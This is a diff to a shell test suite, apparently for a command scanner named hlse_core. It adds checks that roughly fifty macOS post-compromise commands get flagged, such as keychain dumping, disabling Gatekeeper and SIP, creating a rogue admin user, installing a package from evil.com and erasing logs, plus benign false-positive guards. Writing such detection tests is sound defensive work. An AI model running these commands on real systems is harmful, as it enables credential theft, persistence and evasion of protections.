@@ -11671,6 +11671,89 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
     && check "secret FP guard: ssws prose clean" "0" "0" \
     || check "secret FP guard: ssws prose clean" "0" "1"
 
+# ── cycle-229: macOS post-compromise primitives ─────────────
+for c in \
+    'launchctl bootstrap gui/501 /tmp/x.plist' \
+    'launchctl submit -l evil -p /tmp/x' \
+    'launchctl kickstart -k gui/501/com.x' \
+    'launchctl enable gui/501/x' \
+    'spctl --master-disable' \
+    'spctl --add /tmp/x.app' \
+    'xattr -d com.apple.quarantine /tmp/x.app' \
+    'xattr -rc /tmp/x.app' \
+    'xattr -c /tmp/x' \
+    'security find-generic-password -s x -w' \
+    'security find-internet-password -s x -w' \
+    'security export -k login.keychain -o /tmp/x.p12' \
+    'security unlock-keychain -p x' \
+    'security dump-keychain' \
+    'dscl . -create /Users/evil' \
+    'dscl . -append /Groups/admin GroupMembership evil' \
+    'pwpolicy -setpassword x' \
+    'dseditgroup -o edit -a evil -t user admin' \
+    'installer -pkg /tmp/x.pkg -target /' \
+    'installer -pkg http://evil.com/x.pkg -target /' \
+    'pkgutil --expand /tmp/x.pkg /tmp/y' \
+    'pkgutil --forget com.evil' \
+    'defaults write com.apple.loginitems x' \
+    'defaults write com.apple.loginwindow AutoLaunchedApplicationDict x' \
+    'csrutil disable' \
+    'csrutil enable --without kext' \
+    'networksetup -setwebproxy Wi-Fi evil.com 8080' \
+    'networksetup -setdnsservers Wi-Fi 1.2.3.4' \
+    'networksetup -setsocksfirewallproxy Wi-Fi x 1080' \
+    'pfctl -ef /tmp/rules' \
+    'pfctl -f /tmp/rules' \
+    'systemsetup -setremotelogin on' \
+    'systemsetup -setremoteappleevents on' \
+    'tccutil reset All' \
+    'tccutil reset Camera' \
+    'codesign --remove-signature /tmp/x' \
+    'codesign --sign - /tmp/x' \
+    'codesign -s - /tmp/x' \
+    'kextload /tmp/x.kext' \
+    'kmutil load -p /tmp/x.kext' \
+    'profiles install -path=/tmp/x.mobileconfig' \
+    'log erase --all' \
+    'qlmanage -p /tmp/x' \
+    'tmutil delete /tmp/x' \
+    'plutil -replace x -string y /tmp/x.plist' \
+    'nvram boot-args="x"' \
+    'sysdiagnose -f /tmp' \
+    'xcrun swift /tmp/x.swift' \
+    'xcrun swiftc /tmp/x.swift' \
+    'osascript -l JavaScript -e x'; do
+    ./hlse_core paste "$c" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+        && check "paste: $c flagged" "0" "0" \
+        || check "paste: $c flagged" "0" "1"
+done
+for c in 'launchctl list' 'launchctl print gui/501' \
+         'spctl --status' 'spctl --assess /tmp/x' \
+         'xattr -l /tmp/x' 'xattr /tmp/x' \
+         'security list-keychains' 'security show-keychain-info' \
+         'dscl . -read /Users/x' 'dscl . -list /Users' \
+         'pwpolicy -getaccountpolicies' 'dseditgroup -o read admin' \
+         'installer -dominfo' 'pkgutil --pkgs' 'pkgutil --files com.x' \
+         'defaults read com.apple.dock' \
+         'defaults write com.apple.dock tilesize -int 48' \
+         'csrutil status' 'networksetup -getwebproxy Wi-Fi' \
+         'networksetup -listallnetworkservices' 'pfctl -sr' \
+         'systemsetup -getremotelogin' \
+         'codesign -v /tmp/x' 'codesign -dvv /tmp/x' \
+         'profiles show' 'profiles status' \
+         'log show --predicate x' 'log stats' \
+         'qlmanage -r' 'qlmanage -t /tmp/x' \
+         'tmutil status' 'tmutil startbackup' \
+         'plutil -lint x.plist' 'nvram -p' \
+         'xcrun -f swift' 'osascript -e "tell app x to beep"' \
+         'open -a Safari' 'hdiutil info' 'jamf version' \
+         'mdfind foo' 'sfltool dumpbtm' 'caffeinate -u' \
+         'swift --version' 'sqlite3 x.db .tables' 'automator --help'; do
+    ./hlse_core paste "$c" 2>&1 | grep -q '^OK' \
+        && check "paste FP guard: $c clean" "0" "0" \
+        || check "paste FP guard: $c clean" "0" "1"
+done
+
 # ── cycle-228: Unix post-compromise primitives ──────────────
 for c in \
     'useradd -ou 0 -g 0 evil' \
